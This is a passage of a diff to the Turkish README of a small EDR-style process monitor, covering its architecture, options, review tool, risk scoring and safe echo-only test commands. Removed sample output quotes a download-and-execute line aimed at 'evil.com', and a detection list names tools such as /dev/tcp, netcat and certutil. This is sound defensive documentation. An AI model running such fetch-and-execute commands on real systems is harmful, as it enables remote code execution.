-└─────────────────────┘        └──────────────┬─────────────────────┘
-                                              │ yazar
-                                              ▼
-                               ┌────────────────────────────────────┐
-                               │           logs/                    │
-                               │  ├── alerts.jsonl                  │
-                               │  ├── process_log.jsonl (--log-all) │
-                               │  ├── review_queue.jsonl            │
-                               │  └── whitelist.jsonl               │
-                               └──────────────┬─────────────────────┘
-                                              │ okur
-                                              ▼
-                               ┌────────────────────────────────────┐
-                               │         review_tool.py             │
-                               │  Tespitleri incelemek, sınıflandır-│
-                               │  mak ve beyaz listeye almak için   │
-                               │  CLI aracı                         │
-                               └────────────────────────────────────┘
+│                            main.py                               │
+│  Giriş noktası. CLI argümanlarını ayrıştırır, döngüyü yönetir,   │
+│  beyaz listeyi uygular, kural motorunu çağırır, önem düzeyine    │
+│  göre yönlendirir, uyarıları yazdırır.                           │
+└───────┬───────────────────┬──────────────────────┬───────────────┘
+        │ scan()            │ find_suspicious()    │ write_jsonl()
+        ▼                   ▼                      ▼
+┌────────────────┐  ┌──────────────────┐  ┌──────────────────────┐
+│   monitor.py   │  │     rules.py     │  │      logger.py       │
+│ psutil ile     │  │ Örüntüler, risk  │  │ JSONL okur ve yazar. │
+│ süreçleri      │  │ puanları,        │  │ Log dosyalarına      │
+│ listeler.      │  │ eşleştirme ve    │  │ dokunan tek modül.   │
+│ Yalnızca       │  │ önem düzeyi.     │  │                      │
+│ toplama.       │  │ Saf mantık.      │  │                      │
+└────────────────┘  └──────────────────┘  └──────────┬───────────┘
+                                                     │
+                                                     ▼
+                                        ┌────────────────────────┐
+                                        │         logs/          │
+                                        │  alerts.jsonl          │
+                                        │  review_queue.jsonl    │
+                                        │  whitelist.jsonl       │
+                                        │  process_log.jsonl     │
+                                        └───────────┬────────────┘
+                                                    │ okur / günceller
+                                                    ▼
+                                        ┌────────────────────────┐
+                                        │     review_tool.py     │
+                                        │  MEDIUM bulguları      │
+                                        │  incele: beyaz listeye │
+                                        │  al veya tehdide yükselt│
+                                        └────────────────────────┘
 ```
 
-**Veri akışı özeti:**
-1. `main.py` döngüyü başlatır ve yapılandırmayı `monitor.py`'ye geçirir
-2. `monitor.py` örüntüleri `rules.py`'den yükler ve canlı süreçleri tarar
-3. Eşleşmeler `logger.py`'ye gönderilir; bu da yapılandırılmış JSONL'yi `logs/` dizinine yazar
-4. `review_tool.py` manuel önceliklendirme iş akışları için `logs/` dizininden okur
-
----
-
-## Hızlı Demo
-
-**En hızlı test yöntemi** (isteğe bağlı geliştirici aracı):
-```bash
-./dev/demo.sh
-```
-
-```
-# Beklenen çıktı:
-========================================
-  Minimal EDR Monitor — Demo Menu
-========================================
-  1) Run simulation test (no psutil needed)
-  2) Run review tool demo
-  3) Start real monitor (30 seconds)
-  4) Show log statistics
-  q) Quit
-----------------------------------------
-Select an option:
-```
-
-Etkileşimli menü:
-- ✅ Simülasyon testi (psutil gerekmez)
-- 🔍 İnceleme aracı demosu
-- 📊 Gerçek sistem izleme (30 saniye)
-- 📈 İstatistikler
+Toplama (`monitor.py`), tespit mantığı (`rules.py`) ve kalıcılık (`logger.py`)
+ayrı tutulur; bunları orkestre eden tek yer `main.py`'dir. Beyaz liste döngüyü
+kapatır: `review_tool.py` içinde güvenli işaretlediğin şey, izleyici bir sonraki
+başlangıcında geri okunur.
 
 ---
 
 ## Kurulum
 
 ```bash
-python3 -m pip install -r requirements.txt
-```
-
-```
-# Beklenen çıktı:
-Collecting psutil>=5.9.0
-  Downloading psutil-5.9.8-cp311-cp311-macosx_10_9_x86_64.whl (248 kB)
-     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 248.3/248.3 kB 2.1 MB/s eta 0:00:00
-Successfully installed psutil-5.9.8
-```
-
-**veya sanal ortamla:**
-```bash
 python3 -m venv .venv
-source .venv/bin/activate  # Windows: .venv\Scripts\activate
-
-
+source .venv/bin/activate        # Windows: .venv\Scripts\activate
+pip install -r requirements.txt  # psutil
 ```
-
-```
-# Beklenen çıktı:
-created virtual environment CPython3.11.0.final.0-64 in 1234ms
-  creator CPython3Posix(dest=.venv, clear=False, no_vcs_ignore=False, with_pip=True)
-Collecting psutil>=5.9.0
-  ...
-Successfully installed psutil-5.9.8
-```
-
----
 
 ## İzleyiciyi Çalıştırma
 
@@ -603,265 +498,173 @@ python3 main.py
 ```
 
 ```
-# Beklenen çıktı:
-Starting minimal EDR-like process monitor v1.0.0 on Darwin.
+Starting minimal EDR-like process monitor v1.1.0 on Darwin.
 Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
 ```
 
-Çalıştırma seçenekleri:
-```bash
-# Temel aralık (saniye cinsinden), varsayılan 1
-python3 main.py --interval 1
-```
+| Seçenek | Varsayılan | Amaç |
+| --- | --- | --- |
+| `--interval N` | `1` | Tarama döngüleri arası saniye |
+| `--burst N` | `10` | Döngü başına hızlı tarama sayısı (kısa ömürlü süreçler için) |
+| `--burst-sleep N` | `0.05` | Burst taramaları arası saniye |
+| `--log-all` | kapalı | Gözlenen her süreci `process_log.jsonl`'a da yazar |
 
-```
-# Beklenen çıktı:
-Starting minimal EDR-like process monitor v1.0.0 on Darwin.
-Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
-```
+Yoklama (polling) yöntemi, birkaç milisaniye yaşayan bir sürecin iki tarama
+arasında başlayıp bitmesi anlamına gelir. `--burst` biraz CPU karşılığında onu
+yakalama şansını belirgin şekilde artırır:
 
 ```bash
-# Aralık başına N kere burst taraması, burst'ler arasında uyku
 python3 main.py --burst 10 --burst-sleep 0.05
 ```
 
-```
-# Beklenen çıktı:
-Starting minimal EDR-like process monitor v1.0.0 on Darwin.
-Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
-```
+## İnceleme Aracı
+
+MEDIUM bulgular seni bölmez — inceleme için kuyruğa girer:
 
 ```bash
-# Tüm süreçlerin günlüğünü etkinleştir (varsayılan: kapalı, yalnızca uyarılar kaydedilir)
-python3 main.py --log-all
+python3 review_tool.py           # Bekleyen kayıtları gez
+python3 review_tool.py --all     # İncelenmiş kayıtları da göster
+python3 review_tool.py --stats   # Özet sayılar
 ```
 
-```
-# Beklenen çıktı:
-Starting minimal EDR-like process monitor v1.0.0 on Darwin.
-Monitoring 20 suspicious patterns every 1.0s. Press Ctrl-C to stop.
-```
-
----
-
-## İnceleme Aracı (İsteğe Bağlı)
-
-*Not: v1.0, tüm tespitleri varsayılan olarak `alerts.jsonl`'ye kaydeder. İnceleme aracı manuel iş akışları için mevcuttur.*
-
-```bash
-# Bekleyen kayıtları incele
-python3 review_tool.py
-```
-
-```
-# Beklenen çıktı:
-===== EDR Review Tool =====
-Pending records: 3
-
-[1/3] 2026-03-16T10:22:05Z
-  PID: 4521 | Score: 75 | Severity: HIGH
-  Command: bash -c "sleep 2; echo 'curl http://example.com'"
-  Matches: ['curl(25)', 'bash -c(60)']
-Action? [b]enign / [s]uspicious / [w]hitelist / [skip]:
-```
-
-```bash
-# İstatistikleri göster
-python3 review_tool.py --stats
-```
-
-```
-# Beklenen çıktı:
-===== EDR Statistics =====
-Total alerts logged : 12
-  CRITICAL          : 1
-  HIGH              : 4
-  MEDIUM            : 5
-  LOW               : 2
-Whitelisted entries : 3
-Pending review      : 2
-```
-
-```bash
-# Tüm kayıtları göster
-python3 review_tool.py --all
-```
-
-```
-# Beklenen çıktı:
-===== All Records =====
-[2026-03-16T10:20:01Z] CRITICAL | PID 1234 | Score 110 | bash -c curl http://evil.com | base64 -d | bash
-[2026-03-16T10:21:14Z] HIGH     | PID 4521 | Score  75 | bash -c "sleep 2; echo 'curl ...'"
-[2026-03-16T10:22:05Z] MEDIUM   | PID 6643 | Score  50 | python3 -c "import os; os.getcwd()"
-...
-```
+Her kayıt için **Safe** (`whitelist.jsonl`'a eklenir, izleyici artık işaretlemez),
+**Threat** (`alerts.jsonl`'a yükseltilir) veya atla seçeneklerini kullanabilirsin.
 
 ---
 
 ## Örnek Çıktı
 
-### Yüksek Önem Düzeyi (konsola yazdırılır)
+HIGH ve üzeri bir tespit, konsola yazdırılır:
+
 ```
 🚨 [DETECTION - CRITICAL]
-   PID: 1234 | Score: 110
-   Matches: ['base64 -d(80)', 'bash -c(60)', 'curl(25)']
-   Command: bash -c curl http://evil.com | base64 -d | bash
+   PID: 31425 | Score: 135
+   Matches: ['bash -c(60)', 'http://(35)', 'curl(25)', ';(15)']
+   Command: bash -c sleep 2; echo 'curl http://example.com'
 ```
 
-### Düşük/Orta Önem Düzeyi (sessizce kaydedilir)
+### Güvenli şekilde uyarı üretme
+
+Aşağıdaki komutlar şüpheli belirteçler içeren dizeleri yalnızca *ekrana basar* —
+hiçbir şey indirilmez veya çalıştırılmaz. `sleep`, sürecin gözlenebilecek kadar
+yaşamasını sağlar. İzleyici çalışırken ikinci bir terminalde çalıştır.
+
+**Linux / macOS**
+
+```bash
+bash -c "sleep 2; echo 'curl http://example.com'"
+# CRITICAL, puan 135 — bash -c(60), http://(35), curl(25), ;(15)
+
+bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"
+# HIGH, puan 90 — bash -c(60), |(15), ;(15)
+
+bash -c "sleep 2; echo 'python -c \"print(1)\"'"
+# CRITICAL, puan 125 — bash -c(60), python -c(50), ;(15)
 ```
-# Konsola yazdırılmaz; yalnızca logs/alerts.jsonl dosyasına yazılır
-{"severity":"MEDIUM","risk_score":50,"matches":["curl(25)"],"pid":5678,...}
+
+**Windows (PowerShell)**
+
+```powershell
+powershell -Command "Start-Sleep -Seconds 2; Write-Output 'hello'"
+# HIGH, puan 85 — powershell(70), ;(15)
+
+powershell -Command "Start-Sleep -Seconds 2; Write-Output '-EncodedCommand'"
+# CRITICAL, puan 185 — -encodedcommand(100), powershell(70), ;(15)
 ```
+
+Yukarıdaki her puan `tests/test_rules.py` içinde doğrulanıyor.
 
 ---
 
 ## Risk Puanları
 
-**Yüksek Risk (80-100)**
+**Göstergeler — yüksek (80-100)**
 - Kodlanmış komutlar (`-enc`, `-encodedcommand`)
 - Doğrudan TCP bağlantıları (`/dev/tcp`)
 - Base64 çözme (`base64 -d`)
-- DLL çalıştırma (`rundll32`, `mshta`, `regsvr32`)
+- LOLBin'ler (`rundll32`, `mshta`)
 
-**Orta Risk (50-79)**
-- Satır içi komutlarla kabuk yorumlayıcıları (`bash -c`, `powershell`)
-- Ağ araçları (`wget`, `curl`, `nc`)
-- Satır içi kodla betik yorumlayıcıları (`python -c`, `perl -e`)
+**Göstergeler — orta (50-79)**
+- Satır içi komutlu shell yorumlayıcıları (`bash -c`, `powershell`, `pwsh`)
+- Netcat (`nc -`, `netcat`), `regsvr32`, `certutil`, `bitsadmin`
+- Satır içi kodlu script yorumlayıcıları (`python -c`, `perl -e`, `ruby -e`)
 
-**Düşük Risk (20-49)**
-- Komut zincirleme (`&&`, `||`, `|`)
-- URL örüntüleri (`http://`, `https://`)
+**Göstergeler — düşük (20-49)**
+- Ağ indirme araçları (`curl`, `wget`) — genellikle meşru olduğu için düşük
+
+**Değiştiriciler (15-45)** — yalnızca bir göstergeyle birlikte sayılır
+- `download`, `http://`, `https://`, `&&`, `||`, `|`, `;`
+
+Windows ve Unix gösterge setleri `platform.system()` ile otomatik seçilir;
+değiştiriciler her platformda geçerlidir.
 
 ---
 
 ## Dosya Yapısı
 
 ```
+main.py            # Giriş noktası, döngü, önem düzeyi yönlendirmesi
+monitor.py         # psutil ile süreç listeleme
+rules.py           # Örüntüler, risk puanları, eşleştirme mantığı
+logger.py          # JSONL okuma/yazma
+review_tool.py     # MEDIUM bulgular için inceleme CLI'ı
+tests/             # unittest paketi, ek bağımlılık yok
 logs/
-├── process_log.jsonl       # Tüm yeni süreçler (isteğe bağlı, --log-all gerektirir)
-├── alerts.jsonl            # Yüksek tehdit (puan ≥70)
-├── review_queue.jsonl      # İnceleme gerektirir (puan 30-69) — isteğe bağlı iş akışı
-└── whitelist.jsonl         # Güvenli olarak işaretlenmiş (isteğe bağlı)
-
-JSONL şemaları:
-- `process_log.jsonl`: `{timestamp, pid, name, exe, cmdline, create_time, username}` (yalnızca --log-all ile oluşturulur)
-- `alerts.jsonl`: `{timestamp, pid, name, cmdline, matches, risk_score, severity}`
+├── alerts.jsonl        # HIGH/CRITICAL (>= 70), yalnızca ekleme
+├── review_queue.jsonl  # MEDIUM (40-69), incelendikçe yeniden yazılır
+├── whitelist.jsonl     # Onaylanmış örüntüler, başlangıçta okunur
+└── process_log.jsonl   # Ham telemetri, yalnızca --log-all ile
 ```
+
+`alerts.jsonl` ve `review_queue.jsonl` aynı şemayı paylaşır:
+`{pid, severity, risk_score, matches, event, timestamp, status}`; `event` ise
+`{pid, name, exe, cmdline, create_time, username, first_seen, host}`.
+Zaman damgaları `Z` sonekli UTC ISO8601'dir.
 
 ---
 
-## AGENTS.md
+## Testler
 
-Bu proje, kod tabanında herhangi bir değişiklik yapmadan önce yapay zeka kodlama araçları (Claude, Copilot, Cursor vb.) tarafından okunmak üzere tasarlanmış bir `AGENTS.md` dosyası içermektedir.
+```bash
+python3 -m unittest discover -s tests -v
+```
 
-Kapsadığı konular:
-- Mimari ve dosya rolleri
-- Kritik kurallar ve sınırlar (değiştirilmemesi gerekenler)
-- Kodlama stili ve kuralları
-- Bilinen kasıtlı kısıtlamalar
-- Beklenen skorlarla birlikte güvenli test komutları
-
-Bu proje üzerinde çalışan bir yapay zeka aracıysanız önce `AGENTS.md` dosyasını okuyun.
+28 test, standart kütüphane dışında bağımlılık yok. `test_monitor.py` sahte bir
+`psutil` ile çalışır, yani paket gerçek süreçlere dokunmaz. Paket bu README'de
+yayınlanan puanları birebir doğrular — bir kural değişip doküman güncellenmezse
+testler kırılır.
 
 ---
 
-## Notlar
+## Bilinen Sınırlamalar
 
-- Yalnızca YENİ PID'ler günlüğe kaydedilir (izleyici bellekte tutulur).
-- `psutil.NoSuchProcess` ve `psutil.AccessDenied` hataları zarif biçimde ele alınır.
-- Şüpheli anahtar kelimeler `rules.py` içinde tanımlanmıştır.
-- Platform tespiti `platform.system()` aracılığıyla otomatiktir.
-- İnceleme kararları kalıcıdır ve denetlenebilir.
-- Kısa, yaygın numaralandırma komutları (örn. `whoami`, `uname -a`, `id`) gürültüyü azaltmak amacıyla kasıtlı olarak işaretlenmez; son derece kısa ömürlü süreçler, burst taraması etkinleştirilmediği veya komutlar geciktirilmediği sürece (örn. `bash -c 'sleep 2; whoami'`) kaçabilir.
-- Yalnızca `HIGH`/`CRITICAL` uyarılar konsola yazdırılır; `LOW`/`MEDIUM` ise `alerts.jsonl` dosyasına yazılır.
-- Geliştirici/demo yardımcıları `dev/` altında arşivlenir. Bunları tamamen kaldırabilirsiniz.
-
----
-
-## Yol Haritası (v1.x+ için Planlandı)
-
-- **Ebeveyn/çocuk süreç soy ağacı**: Süreç soyunu ve üretme zincirlerini takip etme.
-- **Kalıcı temel çizgiler**: Görülen PID'leri ve beyaz listeleri yeniden başlatmalar arasında kaydetme.
-- **Genişletilmiş tespit kuralları**: Hassas yollara dosya yazma, giden ağ bağlantıları, ayrıcalık yükseltme.
-- **Yapılandırma dosyası desteği**: Kurallar, eşikler ve günlük yolları için YAML/JSON yapılandırması.
-- **Paketleme**: `pipx` veya bağımsız ikili ile kurulum; systemd/launchd servis şablonları.
-- **Entegrasyonlar**: Webhook uyarıları, syslog iletimi, SIEM uyumlu JSON çıktısı.
+- **Tespit yalnızca komut satırı örüntü eşleştirmesidir.** Ebeveyn/çocuk süreç
+  soyağacı, dosya veya ağ telemetrisi yok. Masum bir komut satırına sahip
+  kötücül bir ikili dosya görünmez kalır.
+- **Süreç takibi bellektedir.** Görülen küme yeniden başlatmayı atlatmaz.
+  `(pid, create_time)` ile anahtarlanır; böylece geri dönüştürülen PID'ler doğru
+  şekilde yeni süreç sayılır ve her taramada budanarak sınırlı kalır.
+- **Yoklama, çok kısa ömürlü süreçleri kaçırabilir** (`--burst` ile bile).
+- **LOW bulgular saklanmaz.** Her şeyi istiyorsan `--log-all` kullan.
+- `whoami`, `uname -a` ve `id` bilinçli olarak işaretlenmez.
+- Beyaz liste başlangıçta yüklenir; çalışma sırasında eklenenler yeniden
+  başlatmadan sonra geçerli olur.
 
 ---
 
-## Test / Uyarı Oluşturma (Güvenli Örnekler)
+## Yol Haritası
 
-Aşağıda, izleyici çalışırken uyarı girişleri oluşturmak için yerel olarak çalıştırabileceğiniz güvenli, zararsız örnek komutlar bulunmaktadır. Bu komutlar güvenilmeyen kodu *indirmez veya çalıştırmaz* — yalnızca şüpheli anahtar kelimeleri (yankılanmış) içerir, böylece izleyicinin örüntü eşleştirmesi tetiklenir.
+- **Ebeveyn/çocuk süreç soyağacı** — süreç atalarını ve zincirlerini takip etme
+- **Kalıcı temel çizgiler** — görülen süreçleri ve beyaz listeyi yeniden
+  başlatmalar arasında taşıma
+- **Genişletilmiş telemetri** — hassas yollara dosya yazımı, giden bağlantılar
+- **Yapılandırma dosyası** — kurallar, eşikler ve log yolları için YAML/JSON
+- **Paketleme** — `pipx` kurulumu, systemd/launchd servis şablonları
+- **Entegrasyonlar** — webhook uyarıları, syslog yönlendirme
 
-Linux / macOS (bash/zsh):
-```zsh
-# Komut satırında 'curl' içeren bir süreç oluşturur (ağ çağrısı yok)
-bash -c "sleep 2; echo 'curl http://example.com'"
-```
+Mimari notlar ve tespit motorunda değişiklik yaparken uyulması gereken kurallar
+için [CONTRIBUTING.md](CONTRIBUTING.md) dosyasına bakın.
 
-```
-# Beklenen çıktı (izleyici konsolunda):
-🚨 [DETECTION - CRITICAL]
-   PID: 8821 | Score: 135
-   Matches: ['bash -c(60)', 'http://(35)', 'curl(25)', ';(15)']
-   Command: bash -c "sleep 2; echo 'curl http://example.com'"
-```
+## Lisans
 
-```zsh
-# Komut dizesinde 'base64' belirteci ve '|' borusu içerir
-bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"
-```
-
-```
-# Beklenen çıktı (izleyici konsolunda):
-🚨 [DETECTION - HIGH]
-   PID: 8834 | Score: 75
-   Matches: ['bash -c(60)', '|(15)']
-   Command: bash -c "sleep 2; echo 'hello' | sed 's/hello/ok/'"
-```
-
-```zsh
-# Satır içi yorumlayıcı belirteci (python -c) gösterir, ancak yalnızca dizeyi yankılar
-bash -c "sleep 2; echo 'python -c \"print(1)\"'"
-```
-
-```
-# Beklenen çıktı (izleyici konsolunda):
-🚨 [DETECTION - CRITICAL]
-   PID: 8847 | Score: 125
-   Matches: ['bash -c(60)', 'python -c(50)', ';(15)']
-   Command: bash -c "sleep 2; echo 'python -c \"print(1)\"'"
-```
-
-Windows (PowerShell) — Yönetici/normal PowerShell isteminden çalıştırın:
-```powershell
-# Güvenli: Invoke-Expression benzeri belirteç yazdırır, çalıştırmaz
-powershell -Command "Start-Sleep -Seconds 2; Write-Output 'Invoke-Expression'"
-```
-
-```
-# Beklenen çıktı (izleyici konsolunda):
-🚨 [DETECTION - HIGH]
-   PID: 3310 | Score: 70
-   Matches: ['powershell(70)']
-   Command: powershell -Command "Start-Sleep -Seconds 2; Write-Output 'Invoke-Expression'"
-```
-
-```powershell
-# Güvenli kodlanmış benzeri belirteç (çalıştırma yok)
-powershell -Command "Start-Sleep -Seconds 2; Write-Output 'EncodedCommand'"
-```
-
-```
-# Beklenen çıktı (izleyici konsolunda):
-🚨 [DETECTION - CRITICAL]
-   PID: 3325 | Score: 170
-   Matches: ['-encodedcommand(100)', 'powershell(70)']
-   Command: powershell -Command "Start-Sleep -Seconds 2; Write-Output 'EncodedCommand'"
-```
-
-Notlar:
-- Bu örnekler, sürecin gözlemlenebilmesi için yeterince uzun süre var olması amacıyla `sleep`/`Start-Sleep` kullanır. Gecikme olmadan izleyici çok kısa ömürlü komutları kaçırabilir.
-- Daha yüksek tespit güvenilirliği için izleyiciyi `--burst N --burst-sleep 0.05` ile çalıştırın (örn. `--burst 10`).
-- Gösterilen dizeler (örn. `curl`, `base64`, `python -c`) `rules.py` tarafından eşleştirilir ve ilişkili `risk_score` ve `severity` ile `logs/alerts.jsonl` dosyasına giriş oluşturur.
+MIT — bkz. [LICENSE](LICENSE).
